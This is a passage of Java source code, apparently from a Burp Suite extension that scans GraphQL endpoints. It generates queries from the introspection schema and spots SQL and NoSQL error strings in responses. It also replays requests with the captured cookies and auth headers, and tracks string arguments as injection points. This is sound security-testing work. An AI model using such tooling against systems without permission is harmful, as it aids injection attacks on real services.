            JsonArray types = schema.getAsJsonArray("types");

            for (JsonElement typeEl : types) {
                JsonObject type = typeEl.getAsJsonObject();
                if (!queryTypeName.equals(safeString(type, "name"))) continue;
                if (!type.has("fields") || type.get("fields").isJsonNull()) continue;

                for (JsonElement fieldEl : type.getAsJsonArray("fields")) {
                    JsonObject field = fieldEl.getAsJsonObject();
                    String fieldName = safeString(field, "name");

                    StringBuilder query = new StringBuilder("query {\n  " + fieldName);

                    if (field.has("args") && !field.get("args").isJsonNull()) {
                        JsonArray args = field.getAsJsonArray("args");
                        if (args.size() > 0) {
                            query.append("(");
                            List<String> argParts = new ArrayList<>();
                            for (JsonElement argEl : args) {
                                JsonObject arg = argEl.getAsJsonObject();
                                String argName = safeString(arg, "name");
                                String placeholder = getPlaceholder(arg.getAsJsonObject("type"));
                                argParts.add(argName + ": " + placeholder);
                            }
                            query.append(String.join(", ", argParts));
                            query.append(")");
                        }
                    }

                    String returnTypeFields = getFieldSelection(field.getAsJsonObject("type"), schema, 0);
                    if (!returnTypeFields.isEmpty()) {
                        query.append(" {\n").append(returnTypeFields).append("  }");
                    }

                    query.append("\n}");
                    queries.add(query.toString());
                }
            }
        }

        generatedQueries.put(endpointKey, queries);
    }

    // ==================== TYPE/FIELD HELPERS ====================

    private String getPlaceholder(JsonObject typeObj) {
        if (typeObj == null) return "\"test\"";
        String kind = safeString(typeObj, "kind");
        String name = safeString(typeObj, "name");

        if ("NON_NULL".equals(kind) && typeObj.has("ofType")) {
            return getPlaceholder(typeObj.getAsJsonObject("ofType"));
        }
        if ("LIST".equals(kind) && typeObj.has("ofType")) {
            return "[" + getPlaceholder(typeObj.getAsJsonObject("ofType")) + "]";
        }

        switch (name) {
            case "String": return "\"test\"";
            case "Int": return "1";
            case "Float": return "1.0";
            case "Boolean": return "true";
            case "ID": return "\"1\"";
            default: return "\"test\"";
        }
    }

    private String getFieldSelection(JsonObject typeObj, JsonObject schema, int depth) {
        if (depth > 1 || typeObj == null) return "";

        String kind = safeString(typeObj, "kind");

        if ("NON_NULL".equals(kind) || "LIST".equals(kind)) {
            if (typeObj.has("ofType") && !typeObj.get("ofType").isJsonNull()) {
                return getFieldSelection(typeObj.getAsJsonObject("ofType"), schema, depth);
            }
        }

        if ("SCALAR".equals(kind) || "ENUM".equals(kind)) return "";

        String name = safeString(typeObj, "name");
        if (!schema.has("types")) return "";

        for (JsonElement typeEl : schema.getAsJsonArray("types")) {
            JsonObject type = typeEl.getAsJsonObject();
            if (name.equals(safeString(type, "name"))) {
                if (!type.has("fields") || type.get("fields").isJsonNull()) return "";
                StringBuilder sb = new StringBuilder();
                for (JsonElement fieldEl : type.getAsJsonArray("fields")) {
                    JsonObject field = fieldEl.getAsJsonObject();
                    String fieldName = safeString(field, "name");
                    JsonObject fieldType = field.getAsJsonObject("type");

                    String innerKind = resolveKind(fieldType);
                    if ("SCALAR".equals(innerKind) || "ENUM".equals(innerKind)) {
                        sb.append("    ".repeat(depth + 2)).append(fieldName).append("\n");
                    } else if (depth < 1) {
                        String nested = getFieldSelection(fieldType, schema, depth + 1);
                        if (!nested.isEmpty()) {
                            sb.append("    ".repeat(depth + 2)).append(fieldName).append(" {\n");
                            sb.append(nested);
                            sb.append("    ".repeat(depth + 2)).append("}\n");
                        }
                    }
                }
                return sb.toString();
            }
        }
        return "";
    }

    private String resolveKind(JsonObject typeObj) {
        if (typeObj == null) return "";
        String kind = safeString(typeObj, "kind");
        if ("NON_NULL".equals(kind) || "LIST".equals(kind)) {
            if (typeObj.has("ofType") && !typeObj.get("ofType").isJsonNull()) {
                return resolveKind(typeObj.getAsJsonObject("ofType"));
            }
        }
        return kind;
    }

    private String resolveTypeName(JsonObject typeObj) {
        if (typeObj == null) return "";
        String kind = safeString(typeObj, "kind");
        String name = safeString(typeObj, "name");
        if (("NON_NULL".equals(kind) || "LIST".equals(kind)) && typeObj.has("ofType") && !typeObj.get("ofType").isJsonNull()) {
            return resolveTypeName(typeObj.getAsJsonObject("ofType"));
        }
        return name;
    }

    private boolean isListType(JsonObject typeObj) {
        if (typeObj == null) return false;
        String kind = safeString(typeObj, "kind");
        if ("LIST".equals(kind)) return true;
        if ("NON_NULL".equals(kind) && typeObj.has("ofType") && !typeObj.get("ofType").isJsonNull()) {
            return isListType(typeObj.getAsJsonObject("ofType"));
        }
        return false;
    }

    // ==================== DETECTION HELPERS ====================

    private boolean containsSqlError(String body) {
        if (body == null) return false;
        String lower = body.toLowerCase();
        return lower.contains("sql syntax") || lower.contains("sql error")
                || lower.contains("syntax error") && (lower.contains("sql") || lower.contains("query"))
                || lower.contains("mysql") && lower.contains("error")
                || lower.contains("postgresql") && lower.contains("error")
                || lower.contains("sqlite") && lower.contains("error")
                || lower.contains("ora-") || lower.contains("microsoft sql")
                || lower.contains("unclosed quotation") || lower.contains("quoted string not properly terminated")
                || lower.contains("sqlstate") || lower.contains("pg_")
                || lower.contains("you have an error in your sql");
    }

    private boolean containsNosqlError(String body) {
        if (body == null) return false;
        String lower = body.toLowerCase();
        return lower.contains("mongoerror") || lower.contains("mongo")
                || lower.contains("$where") || lower.contains("bsontype")
                || lower.contains("cast to objectid") || lower.contains("invalid operator")
                || lower.contains("unknown operator");
    }

    // ==================== REQUEST BUILDING HELPERS ====================

    /**
     * Build a GraphQL POST request to the given path with JSON body.
     * Preserves cookies and auth headers from the original request.
     */
    private HttpRequest buildGqlRequest(HttpRequest originalRequest, String path, String jsonBody) {
        StringBuilder headers = new StringBuilder();
        headers.append("POST ").append(path).append(" HTTP/1.1\r\n");
        headers.append("Host: ").append(originalRequest.httpService().host()).append("\r\n");
        headers.append("Content-Type: application/json\r\n");
        headers.append("Content-Length: ").append(jsonBody.length()).append("\r\n");

        // Carry over cookies and authorization from original request
        for (var h : originalRequest.headers()) {
            String name = h.name().toLowerCase();
            if (name.equals("cookie") || name.equals("authorization")
                    || name.equals("x-csrf-token") || name.equals("x-xsrf-token")) {
                headers.append(h.name()).append(": ").append(h.value()).append("\r\n");
            }
        }

        headers.append("\r\n");
        headers.append(jsonBody);

        return HttpRequest.httpRequest(originalRequest.httpService(), headers.toString());
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) {
                int q = url.indexOf('?', s);
                return q >= 0 ? url.substring(s, q) : url.substring(s);
            }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("graphql.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    private void checkInterrupted() throws InterruptedException {
        if (Thread.interrupted()) throw new InterruptedException("GraphQL scan interrupted");
    }

    private String safeString(JsonObject obj, String key) {
        if (obj == null || !obj.has(key) || obj.get(key).isJsonNull()) return "";
        return obj.get(key).getAsString();
    }

    // ==================== LIFECYCLE ====================

    @Override
    public void destroy() {
        detectedEndpoints.clear();
        schemas.clear();
        generatedQueries.clear();
    }

    // Accessors for UI
    public ConcurrentHashMap<String, Boolean> getDetectedEndpoints() { return detectedEndpoints; }
    public ConcurrentHashMap<String, JsonObject> getSchemas() { return schemas; }
    public ConcurrentHashMap<String, List<String>> getGeneratedQueries() { return generatedQueries; }
    public String getRawIntrospectionJson() { return rawIntrospectionJson; }

    // ==================== INNER CLASSES ====================

    /**
     * Represents a String/ID argument on a query or mutation field that can be injected into.
     */
    private static class InjectableArg {
        final String parentType;   // "Query" or "Mutation"
        final String fieldName;    // e.g. "user"
        final String argName;      // e.g. "name"
        final String argType;      // "String" or "ID"
        final JsonObject returnType;
        final JsonObject fieldDef;
        final JsonObject schema;

        InjectableArg(String parentType, String fieldName, String argName, String argType,
                       JsonObject returnType, JsonObject fieldDef, JsonObject schema) {
            this.parentType = parentType;
            this.fieldName = fieldName;
            this.argName = argName;
            this.argType = argType;
            this.returnType = returnType;
            this.fieldDef = fieldDef;
            this.schema = schema;
        }
    }
}
